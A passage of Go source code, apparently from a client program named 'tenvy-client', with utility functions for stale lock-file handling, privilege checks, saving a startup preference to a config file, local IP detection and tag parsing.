			return nil, fmt.Errorf("cleanup stale mutex %s: %w", key, removeErr)
		}
		recovered = true
	}

	return nil, fmt.Errorf("mutex %s is already acquired", key)
}

func lockFileIsStale(path string) (bool, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return true, nil
		}
		return false, err
	}

	pid := parseLockPID(string(data))
	if pid <= 0 {
		return true, nil
	}

	alive, err := platform.ProcessExists(pid)
	if err != nil {
		return false, err
	}

	return !alive, nil
}

func parseLockPID(content string) int {
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if !strings.HasPrefix(trimmed, "pid=") {
			continue
		}
		value := strings.TrimSpace(strings.TrimPrefix(trimmed, "pid="))
		pid, err := strconv.Atoi(value)
		if err != nil || pid <= 0 {
			continue
		}
		return pid
	}
	return 0
}

func enforcePrivilegeRequirement(required bool) error {
	if !required {
		return nil
	}
	if platform.CurrentUserIsElevated() {
		return nil
	}
	return errors.New("administrator privileges are required")
}

func configureStartupPreference(target string) error {
	target = strings.TrimSpace(target)
	if target == "" {
		return errors.New("no target provided for startup preference")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("resolve home directory: %w", err)
	}

	var configDir string
	if runtime.GOOS == "windows" {
		configDir = filepath.Join(homeDir, "AppData", "Roaming", "Tenvy")
	} else {
		configDir = filepath.Join(homeDir, ".config", "tenvy")
	}

	if err := os.MkdirAll(configDir, 0o755); err != nil {
		return fmt.Errorf("create startup config directory: %w", err)
	}

	entryPath := filepath.Join(configDir, "startup-target.txt")
	if err := os.WriteFile(entryPath, []byte(target+"\n"), 0o644); err != nil {
		return fmt.Errorf("persist startup preference: %w", err)
	}

	return nil
}

func detectPrimaryIP() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range interfaces {
		if (iface.Flags&net.FlagUp) == 0 || (iface.Flags&net.FlagLoopback) != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ip := extractIP(addr)
			if ip == "" {
				continue
			}
			return ip
		}
	}
	return ""
}

func extractIP(addr net.Addr) string {
	switch v := addr.(type) {
	case *net.IPNet:
		if v.IP.IsLoopback() {
			return ""
		}
		ip := v.IP.To4()
		if ip != nil {
			return ip.String()
		}
		if v.IP.To16() != nil {
			return v.IP.String()
		}
	case *net.IPAddr:
		if v.IP.IsLoopback() {
			return ""
		}
		ip := v.IP.To4()
		if ip != nil {
			return ip.String()
		}
		if v.IP.To16() != nil {
			return v.IP.String()
		}
	}
	return ""
}

func parseTags(value string) []string {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	parts := strings.Split(value, ",")
	tags := make([]string, 0, len(parts))
	for _, part := range parts {
		trimmed := strings.TrimSpace(part)
		if trimmed != "" {
			tags = append(tags, trimmed)
		}
	}
	if len(tags) == 0 {
		return nil
	}
	return tags
}

func fallback(value, fallbackValue string) string {
	if strings.TrimSpace(value) == "" {
		return fallbackValue
	}
	return value
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

func getEnv(key, fallback string) string {
	if value := strings.TrimSpace(os.Getenv(key)); value != "" {
		return value
	}
	return fallback
}

func userAgent() string {
	return fmt.Sprintf("tenvy-client/%s", buildVersion)
}
